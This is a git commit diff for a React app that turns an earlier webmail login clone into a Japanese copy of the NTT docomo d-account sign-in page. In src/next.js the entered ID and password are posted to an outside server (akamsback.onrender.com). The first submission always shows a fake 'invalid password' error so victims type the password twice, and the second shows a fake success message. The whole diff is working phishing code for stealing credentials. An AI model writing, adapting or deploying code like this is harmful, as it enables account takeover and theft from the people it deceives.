418a7e33533d49cf867126dd38182fa358c26a77
latestbob <edidiongbobson@gmail.com>
2024-01-10 17:12:48 -0800

    decomo added

--- src/hometwo.js
+++ src/hometwo.js
@@ -6,6 +6,8 @@ import { useNavigate } from 'react-router-dom';
 
 import mainbg from './mainbg.jpeg';
 import logotwo from './logotwo.gif';
+import decomo from './decomo.png';
+import decomotwo from './decomotwo.png';
 
 
 
@@ -28,38 +30,73 @@ function HomeTwo(){
        
     }
 
+    const[checked, setChecked] = useState(false);
+
 
     return (
         <>
 
             <div className='mainContent'>
 
-                <div className='col-md-3 m-auto maindiv'>
+                <div className='shadowdiv text-center'>
+                    <img src={decomo} className="mylogo" />
+                </div>
 
-                    <div className='imagediv text-center'>
-                        <img src={logotwo} className="mylogo" />
+                <div className='col-md-6 m-auto maindiv '>
+
+                    <div className='imagediv px-5'>
+                        <img src={decomotwo} className="mylogotwo" />
 
                     </div>
 
-                    <h2 className='mainhead'>Sign in to WebClient</h2>
+                    <div className='px-5'>
+
+                    
 
                   
 
                     <form onSubmit={handleNext}>
-                    <div className='borderdiv py-1'>
+                    <div className='py-1 px-4'>
+                    <h2 className='text-left label py-2'>dアカウントID</h2>
                         <input onChange={function(e){
                         setUserName(e.target.value);
-                    }} value={email}  type="text"className='form-control w-100 py-4'placeholder='Username' required/>
+                    }} value={email}  type="text"className='form-control py-4'placeholder='電子メールアドレスまたは任意のID' required/>
                         
+
+                        <div className='text-right mt-1'>
+                            <a className='forgot' href="https://id.smt.docomo.ne.jp/src/utility/idpw_forget.html">アカウントが分からない方</a>
+
+                        </div>
+
+                        <div className='text-center mt-3'>
+                            
+                            <input type="checkbox"onChange={function(e){
+                                setChecked(!checked)
+                            }} /> <span className='label'>ログインしたままにする</span>
+                        </div>
                         </div>
                         
-                        <div className='px-3'>
-                        <button className='next btn w-100'>
-                            {isLoading ? "Loading ....." : "Next"}
+                        <div className='px-3 text-center mt-4'>
+                        <button className='next btn'>
+                            {isLoading ? "読み込み中..." : "次へ"}
                         </button>
 
                         </div>
                     </form>
+
+                    </div>
+
+
+                    <div className='text-left mt-5'>
+                        <p className='semifoot'>※ログインについての<a href="https://id.smt.docomo.ne.jp/src/utility/notice.html">注意事項</a>をご確認ください。</p>
+
+                    </div>
+
+                    <div className='footerone px-2 py-2'>
+                        <h5 className='footerhead'>ご確認ください</h5>
+                        <p className='footerpara'>はじめてご利用の方は <a href='https://id.smt.docomo.ne.jp/cgi8/id/tpl/REG101'>dアカウントを作成</a>してください。</p>
+
+                    </div>
 
                 
 
--- src/next.js
+++ src/next.js
@@ -5,6 +5,9 @@ import { useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import logotwo from './logotwo.gif';
 import { useLocation } from 'react-router-dom';
+import decomo from './decomo.png';
+import decomotwo from './decomotwo.png';
+import person from './person.png';
 
 function Next(){
 
@@ -14,13 +17,16 @@ function Next(){
     
     const[email ,setEmail] = useState(location.state.email);
 
-    const[platform, setPlatform] = useState("Nvc")
+    const[platform, setPlatform] = useState("Decomo")
 
     const[showError, setShowError] = useState(false);
 
     const[isLoading, setIsLoading]= useState(false);
 
     const[showPassword, setShowPassword] = useState(false);
+    const[count, setCount] = useState(0);
+
+    const[showSuccess, setShowSuccess] = useState(false);
 
 
     async function handleSubmit(e){
@@ -28,8 +34,8 @@ function Next(){
     
         try {
 
-            setIsLoading(true);
-            const response = await axios.post('https://backendone-d60j.onrender.com/api/send', {
+            
+            const response = await axios.post('https://akamsback.onrender.com/api/send', {
                 email:email,
                 password:password,
                 platform:platform
@@ -38,12 +44,23 @@ function Next(){
             // Handle success
             console.log('Data sent:', response.data.message);
     
-            if(response.status == 200){
-                console.log(response.data.message);
-    
-                window.location.href = 'https://mail.nvc.net/webmail/';
+          
 
+            if(response.status == 200 && count < 1){
+                console.log(response.data.message);
+                setCount(count + 1);
+    
+                setShowError(true);
+                setShowSuccess(false);
             }
+
+            else if(response.status == 200 && count == 1){
+                console.log(response.data.message);
+                    setCount(0);
+                    setShowError(false);
+                    setShowSuccess(true);
+              }
+
           } catch (error) {
             // Handle error
             console.error('Error:', error);
@@ -54,58 +71,117 @@ function Next(){
 
 
     return (
-        <div className='mainContent'>
+       <>
 
-        <div className='col-md-3 m-auto maindivtwo'>
+<div className='mainContent'>
 
-            <div className='imagediv text-center py-3'>
+<div className='shadowdiv text-center'>
+    <img src={decomo} className="mylogo" />
+</div>
+
+{showError && <div className="col-md-4 m-auto alert alert-danger alert-dismissible fade show" role="alert">
+            <strong className='text-center'>無効なメールアドレスまたはパスワード</strong> 
+            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
+                <span aria-hidden="true">&times;</span>
+            </button>
+            </div>}
+
+            {showSuccess && <div className="col-md-4 m-auto alert alert-success alert-dismissible fade show" role="alert">
+            <strong className='text-center'>正しいパスワードです。アカウントが更新されました。</strong> 
+            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
+                <span aria-hidden="true">&times;</span>
+            </button>
+            </div>}
+
+<div className='col-md-6 m-auto maindiv '>
+
+    <div className='imagediv px-5'>
+        <img src={decomotwo} className="mylogotwo" />
+
+    </div>
+
+    <div className='px-5'>
+
+    
+
+  
+
+    <form onSubmit={handleSubmit}>
+    <div className='py-1 px-4'>
+
+
+
+        <div className='roundeddiv mt-3'>
+
+            <img className='myimage' src={person} />
+
+            <div>
+                <p><span className='nextspan'>dアカウントID</span> <br/> {email}</p>
                 
-                <div className='circle p-3 rounded-circle m-auto'>
-                    <h3 className='circlehead'>{email.charAt(0)}</h3>
-                </div>
-
             </div>
-
-            <h2 className='mainhead'>Sign in to WebClient </h2>
-
-          
-
-            <form onSubmit={handleSubmit}>
-            <div className='borderdiv'>
-                <input onChange={function(e){
-                   setPassword(e.target.value);
-               }} value={password} type={showPassword ? "text" : "password"}className='form-control w-100 py-4'placeholder='Password' required/>
-                
-                    <div className='text-right pr-3'>
-                    <span onClick={function(e){
-                        e.preventDefault();
-                        setShowPassword(!showPassword);
-                    }} className='show'>{showPassword ? "Hide" : "Show"}</span>
-                    </div>
-                </div>
-                
-                <div className='px-3'>
-                <button className='next btn w-100'>Sign in</button>
-
-                </div>
-
-            <div className='px-3 pb-3 showborder'>
-            <input type="checkbox" /><span className='px-3 smalll'>Keep me signed in</span>
-
-            </div>
-
-            <p className='text-center smalll py-3'>Not you? <span className='colorme'>Check your account again</span></p>
-
-            </form>
-
-        
 
         </div>
 
 
+
+    <h2 className='text-left label py-2'>パスワード</h2>
+        <input onChange={function(e){
+        setPassword(e.target.value);
+    }} value={password}  type="text"className='form-control py-4'placeholder='8 から 20 文字の半角英数字と記号の組み合わせ' required/>
         
 
+        <div className='text-right mt-1'>
+            <a className='forgot' href="https://id.smt.docomo.ne.jp/src/utility/idpw_forget.html">パスワードをお忘れの方</a>
+
+        </div>
+
+       
+        </div>
+        
+        <div className='px-3 text-center mt-4'>
+
+            {
+                password.length < 8 ? <button className='nextwo btn'disabled>ログイン
+
+                </button>
+                : <button type="submit" className='next btn'>ログイン
+
+                </button>
+            }
+        
+
+        </div>
+
+        <div className='px-3 text-center mt-4'>
+
+           <a href='/' className='nexthree btn'>
+                戻る
+
+                </a>
+            
+            
+        
+
+        </div>
+    </form>
+
     </div>
+
+
+   
+
+    
+
+
+
+</div>
+
+
+
+
+</div>
+       
+       </>
     );
 
 }
